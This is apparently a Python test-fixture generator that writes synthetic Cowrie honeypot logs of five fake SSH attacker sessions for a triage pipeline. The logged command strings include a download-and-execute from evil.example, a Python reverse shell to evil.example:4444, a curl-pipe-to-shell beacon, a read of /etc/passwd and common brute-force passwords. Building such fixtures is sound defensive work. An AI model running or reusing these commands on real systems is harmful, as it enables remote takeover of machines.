#!/usr/bin/env python3
"""
Generate richer, multi-stage Cowrie-style JSON samples for demos and tests.

Produces several distinct attacker sessions so the pipeline has something
interesting to score and triage.
"""

from __future__ import annotations

import json
from datetime import datetime, timedelta, timezone
from pathlib import Path

OUT = Path(__file__).resolve().parent / "cowrie.json"


def ts(base: datetime, seconds: int) -> str:
    return (base + timedelta(seconds=seconds)).strftime("%Y-%m-%dT%H:%M:%S.000Z")


def event(base: datetime, offset: int, eventid: str, session: str, src_ip: str, **extra):
    e = {
        "eventid": eventid,
        "timestamp": ts(base, offset),
        "session": session,
        "src_ip": src_ip,
    }
    e.update(extra)
    return e


def main() -> None:
    base = datetime(2026, 8, 27, 2, 14, 0, tzinfo=timezone.utc)
    events = []

    # ------------------------------------------------------------------
    # Session a1 — full attack chain (should become ALERT)
    # brute-ish fails → success → wget → download
    # ------------------------------------------------------------------
    ip1 = "185.220.101.7"
    events += [
        event(base, 0,  "cowrie.session.connect", "a1", ip1, src_port=40001, dst_port=2222),
        event(base, 1,  "cowrie.login.failed",    "a1", ip1, username="root",  password="123456"),
        event(base, 2,  "cowrie.login.failed",    "a1", ip1, username="admin", password="admin"),
        event(base, 3,  "cowrie.login.failed",    "a1", ip1, username="root",  password="root"),
        event(base, 15, "cowrie.login.success",   "a1", ip1, username="root",  password="password"),
        event(base, 20, "cowrie.command.input",   "a1", ip1, input="uname -a"),
        event(base, 22, "cowrie.command.input",   "a1", ip1, input="id"),
        event(base, 25, "cowrie.command.input",   "a1", ip1, input="wget http://evil.example/x.sh -O /tmp/x.sh"),
        event(base, 26, "cowrie.session.file_download", "a1", ip1, url="http://evil.example/x.sh"),
        event(base, 28, "cowrie.command.input",   "a1", ip1, input="chmod +x /tmp/x.sh"),
        event(base, 30, "cowrie.command.input",   "a1", ip1, input="/tmp/x.sh"),
    ]

    # ------------------------------------------------------------------
    # Session b2 — pure brute-force, never gets in (REVIEW or ALERT)
    # ------------------------------------------------------------------
    ip2 = "45.33.32.156"
    base2 = base + timedelta(minutes=5)
    events.append(event(base2, 0, "cowrie.session.connect", "b2", ip2, src_port=51000, dst_port=2222))
    for i, (u, p) in enumerate([
        ("root", "123456"), ("root", "password"), ("root", "toor"),
        ("admin", "admin"), ("ubuntu", "ubuntu"), ("oracle", "oracle"),
        ("postgres", "postgres"), ("test", "test"), ("root", "qwerty"),
    ]):
        events.append(event(base2, 1 + i, "cowrie.login.failed", "b2", ip2, username=u, password=p))

    # ------------------------------------------------------------------
    # Session c3 — successful login + quiet recon only (REVIEW)
    # ------------------------------------------------------------------
    ip3 = "103.27.188.9"
    base3 = base + timedelta(minutes=12)
    events += [
        event(base3, 0,  "cowrie.session.connect", "c3", ip3, src_port=42222, dst_port=2222),
        event(base3, 2,  "cowrie.login.success",   "c3", ip3, username="admin", password="admin123"),
        event(base3, 8,  "cowrie.command.input",   "c3", ip3, input="whoami"),
        event(base3, 12, "cowrie.command.input",   "c3", ip3, input="cat /etc/passwd"),
        event(base3, 18, "cowrie.command.input",   "c3", ip3, input="ps aux"),
        event(base3, 25, "cowrie.command.input",   "c3", ip3, input="history"),
    ]

    # ------------------------------------------------------------------
    # Session d4 — noisy scanner, few fails, no success (should DISMISS)
    # ------------------------------------------------------------------
    ip4 = "198.51.100.23"
    base4 = base + timedelta(minutes=20)
    events += [
        event(base4, 0, "cowrie.session.connect", "d4", ip4, src_port=33333, dst_port=2222),
        event(base4, 1, "cowrie.login.failed",    "d4", ip4, username="root", password="root"),
        event(base4, 2, "cowrie.login.failed",    "d4", ip4, username="admin", password="1234"),
    ]

    # ------------------------------------------------------------------
    # Session e5 — reverse-shell style commands after login (ALERT)
    # ------------------------------------------------------------------
    ip5 = "91.92.241.88"
    base5 = base + timedelta(minutes=30)
    events += [
        event(base5, 0,  "cowrie.session.connect", "e5", ip5, src_port=4488, dst_port=2222),
        event(base5, 3,  "cowrie.login.success",   "e5", ip5, username="root", password="Passw0rd!"),
        event(base5, 10, "cowrie.command.input",   "e5", ip5, input="uname -a"),
        event(base5, 15, "cowrie.command.input",   "e5", ip5, input="python -c 'import socket,os,pty;s=socket.socket();s.connect((\"evil.example\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"),
        event(base5, 20, "cowrie.command.input",   "e5", ip5, input="curl http://evil.example/beacon | sh"),
    ]

    # Write one JSON object per line (Cowrie format)
    OUT.write_text("\n".join(json.dumps(e, separators=(",", ":")) for e in events) + "\n")
    print(f"Wrote {len(events)} events across 5 sessions → {OUT}")


if __name__ == "__main__":
    main()
